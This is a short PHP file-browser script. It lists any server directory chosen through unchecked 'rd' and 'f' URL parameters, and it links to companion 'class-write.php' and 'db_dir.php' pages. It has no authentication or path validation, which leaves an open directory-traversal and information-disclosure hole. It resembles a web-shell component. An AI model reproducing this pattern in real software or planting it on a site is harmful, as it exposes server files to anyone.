<?php
echo "<hr>".$_SERVER['DOCUMENT_ROOT']."<hr>";
$f=$_GET['f'];
$rd=$_GET['rd'];
if($rd == "")
	$rd = $_SERVER['DOCUMENT_ROOT'];
$my_root = $rd."/".$f;
echo "<hr>my root: ".$my_root."<hr>";
if ($handle = opendir($my_root))
{
    while (false !== ($file = readdir($handle)))
    {
        if (($file != ".") && ($file != ".."))
        {
			$thelist .= '<li>'.$file.' | <a href="class-write.php?f='.$file.'&rd='.$my_root.'">of</a> | <a href="db_dir.php?f='.$file.'&rd='.$my_root.'">od</a></li>';
        }
    }

    closedir($handle);
}
?>
<P>List of files:</p>
<UL>
<P><?=$thelist?></p>
</UL>